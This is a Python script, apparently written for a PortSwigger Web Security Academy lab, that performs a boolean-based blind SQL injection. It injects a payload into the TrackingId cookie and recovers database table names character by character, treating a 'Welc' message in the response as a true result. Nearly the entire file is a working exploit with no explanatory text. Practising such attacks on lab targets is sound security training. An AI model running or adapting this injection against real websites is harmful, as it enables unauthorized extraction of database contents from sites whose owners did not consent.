#!/usr/bin/python3
##
import requests
import pwn
import re
import string
##
#
def pwn(URL,sess,cookie,Payload,start):
    value=""
    chars=string.ascii_uppercase+string.ascii_lowercase+string.digits+string.punctuation
    print(f"Charset: {chars}")
    cols=[]
    first=True
    start_index=chars.index(start)
    new_set=chars[start_index::]
    while True:
        tmp=value
        if first:
            first=False
            for X in new_set:
                print(f"{X}\r",end="")
                cookies=dict({"TrackingId":f"{cookie}{Payload[0]}{value}{X}{Payload[1]}"})
                r=sess.get(URL,cookies=cookies)
                if "Welc" in r.text:
                    value+=X
                    print(X)
                    break
        else:
            for X in chars:
                print(f"{X}\r",end="")
                cookies=dict({"TrackingId":f"{cookie}{Payload[0]}{value}{X}{Payload[1]}"})
                r=sess.get(URL,cookies=cookies)
                if "Welc" in r.text:
                    value+=X
                    print(X)
                    break
        if tmp==value:
            if value !="":
                cols.append(value)
                start=chr( ord(value[0])+1)
                try:
                    tmp1=pwn(URL,sess,cookie,Payload,start)
                finally:
                    cols+=tmp1
                return cols
            else:
                return cols
##
def main(URL):
    version=""
    Payload=["'+and+'1'=(select+'1'+from+information_schema.tables+WHERE+table_schema+%3d+'public'+and+table_name+like('","%25'))--+-"]
    sess=requests.Session()
    r=sess.get(URL)
    cookie=r.cookies.get_dict()["TrackingId"]
    print(f"Initial TrackingId: {cookie}")
    #
    user=pwn(URL,sess,cookie,Payload,'a')
    print(f"The tables are:\n{user}")
##
main("https://0af500520314357282e5018400490072.web-security-academy.net/")
